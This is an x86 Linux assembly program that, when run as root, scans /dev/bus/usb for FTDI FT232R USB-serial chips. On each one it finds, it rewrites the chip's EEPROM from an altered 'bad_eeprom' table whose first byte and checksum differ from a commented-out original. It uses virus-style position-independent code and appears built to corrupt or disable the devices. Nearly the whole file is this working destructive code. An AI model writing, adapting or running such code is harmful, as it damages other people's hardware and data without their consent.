;The MIT License (MIT)

;Copyright (c) 2024 David Reguera Garcia aka Dreg & Ivan Redondo aka S0S4

;Permission is hereby granted, free of charge, to any person obtaining a copy
;of this software and associated documentation files (the "Software"), to deal
;in the Software without restriction, including without limitation the rights
;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
;copies of the Software, and to permit persons to whom the Software is
;furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included in all
;copies or substantial portions of the Software.

;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
;SOFTWARE.


; By: @S0S4 & Dreg
; github.com/therealdreg

global _start

%macro memset 3
    mov ecx, %1
    mov edi, %2
    mov al, %3
    cld
; %%repeat:
    rep stosb
;    loop  %%repeat
%endmacro

%macro bzero 2
     memset %1, %2, 0x00
%endmacro

%macro allocstackz 1
     sub esp, %1
     bzero %1, esp
%endmacro


section .text



_start:

    call get_delta
    mid_delta:


    jmp after_delta

    get_delta:
        mov ebp, [esp]
        sub ebp, mid_delta
        ret
    after_delta:

;   CHECK UID

    mov eax, 24
    int 80h

    cmp eax, 0x0
    jne msg

    push 0x00
    push 0x3030302f ; /000
    push 0x3130302f ; /001
    push 0x6273752f ; /usb
    push 0x7375622f ; /bus
    push 0x7665642f ; /dev 

    


main:
    cmp byte [esp+19], 0x3A ; primer 0
    je incdesc


; open()

    mov ebx, esp ; filename 
    mov ecx, 0x2 ; RWX
    xor edx, edx 
    mov eax, 0x5
    int 80h

    cmp eax, 0x0
    jl close_fd

    mov esi, eax

; read() 

    allocstackz 0x30

    mov ebx, esi 
    mov ecx, esp 
    mov edx, 0x30
    mov eax, 0x3
    int 80h

    cmp eax, 0
    jl close_fd 


; Check if FTDI232r

    mov ecx, [esp+8]
    add esp, 0x30
    cmp DWORD ecx, 0x60010403
    jne close_fd

; RESET

    allocstackz 0x20

    mov BYTE [esp], 0x40
    mov BYTE [esp+0x4], 0x01

    mov ebx, esi 
    mov ecx, 0xC0105500 ; CONTROL_TRANSFER
    mov edx, esp 
    mov eax, 0x36
    int 80h

    cmp eax, 0x0
    jl end

    ; Poll Modem

    mov BYTE [esp], 0xC0
    mov BYTE [esp+0x1], 0x05
    mov BYTE [esp+0x4], 0x01
    mov BYTE [esp+0x6], 0x02

    mov eax, 0x36
    int 80h



    ; Latency


    mov BYTE [esp], 0x40
    mov BYTE [esp+0x1], 0x09
    mov BYTE [esp+0x2], 0x77
    mov BYTE [esp+0x6], 0x00

    mov eax, 0x36
    int 80h

    cmp eax, 0x0
    jl end

; WRITECELL


    lea edi, [ebp+bad_eeprom]
    mov esi, 0x0
    xor ecx, ecx 
    write_cell_loop:

    mov cx, [edi]

    mov BYTE [esp], 0x40
    mov BYTE [esp+0x01], 0x91
    mov BYTE [esp+0x02], cl
    mov BYTE [esp+0x03], ch
    mov DWORD [esp+0x04], esi

    mov edx, esp
    mov ecx, 0xC0105500 ; 0xC014556F
    mov eax, 0x36
    int 80h

    inc esi
    add edi, 0x2

    xor ecx, ecx 
    cmp esi, 0x40
    jne write_cell_loop
    add esp, 0x20

close_fd:
    ;add esp, 4*1

    mov ebx, eax 
    mov eax, 0x6
    int 80h

    inc byte [esp+19]

    jmp main

incdesc:

    mov BYTE [esp+19], 0x30
    inc BYTE [esp+18]

    cmp BYTE [esp+18], 0x3A
    jne main

    mov BYTE [esp+18], 0x30
    inc BYTE [esp+17]

    cmp BYTE [esp+17], 0x3A
    jne main
    jmp end

msg:

    mov ebx, 0x1
    lea ecx, [ebp+uid_msg]
    mov edx, 0x8

    mov eax, 0x4
    int 80h

end:

    mov eax, 0x1
    mov ebx, 0x0
    int 80h

;good_eeprom db 0x00, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06,0xA0, 0x2D, 0x08, 0x00, 0x00, 0x02, 0x98, 0x0A,0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00,0x49, 0x00, 0x20, 0x03, 0x46, 0x00, 0x54, 0x00,0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00,0x20, 0x00, 0x55, 0x00, 0x41, 0x00, 0x52, 0x00,0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00,0x41, 0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD5, 0x54,0x28, 0x04, 0xD7, 0xFB, 0x00, 0x00, 0x2D, 0xEB,0x36, 0x12, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x31, 0x41, 0x4D, 0x55, 0x53, 0x34, 0x4C, 0x46,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF

bad_eeprom db 0x02, 0x40, 0x03, 0x04, 0x01, 0x60, 0x00, 0x06,0xA0, 0x2D, 0x08, 0x00, 0x00, 0x02, 0x98, 0x0A,0xA2, 0x20, 0xC2, 0x12, 0x23, 0x10, 0x05, 0x00,0x0A, 0x03, 0x46, 0x00, 0x54, 0x00, 0x44, 0x00,0x49, 0x00, 0x20, 0x03, 0x46, 0x00, 0x54, 0x00,0x32, 0x00, 0x33, 0x00, 0x32, 0x00, 0x52, 0x00,0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00,0x20, 0x00, 0x55, 0x00, 0x41, 0x00, 0x52, 0x00,0x54, 0x00, 0x12, 0x03, 0x41, 0x00, 0x31, 0x00,0x30, 0x00, 0x4C, 0x00, 0x49, 0x00, 0x57, 0x00,0x41, 0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x54

uid_msg db "Bad UID"
